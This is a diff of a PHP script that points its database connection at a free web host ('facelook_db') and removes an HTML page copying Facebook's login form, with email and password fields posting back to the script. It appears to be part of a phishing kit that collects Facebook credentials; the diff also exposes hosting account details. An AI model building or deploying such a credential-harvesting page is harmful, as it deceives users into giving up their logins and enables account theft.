@@ -1,9 +1,10 @@
+
 <?php
 // Database connection details
-$servername = "localhost";
-$username = "root";
+$servername = "sql303.infinityfree.com";
+$username = "if0_37747211";
 $password = "";
-$dbname = "facebook_db";
+$dbname = "if0_37747211_facelook_db";
 
 // Create connection
 $conn = new mysqli($servername, $username, $password, $dbname);
@@ -40,28 +41,3 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 $conn->close();
 ?>
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook Login</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <div class="facebook-logo">facebook</div>
-    <div class="login-container">
-        <div class="login-title">Log Into Facebook</div>
-        <form method="post">
-            <input type="text" placeholder="Email address or phone number" name="email" require>
-            <input type="password" placeholder="Password" name="password" require>
-            <button type="submit" class="login-button">Log In</button>
-        </form>
-        <div class="links">
-            <a href="#">Forgot account?</a>
-            <span class="divider">·</span>
-            <a href="#">Sign up for Facebook</a>
-        </div>
-    </div>
-</body>
-</html>
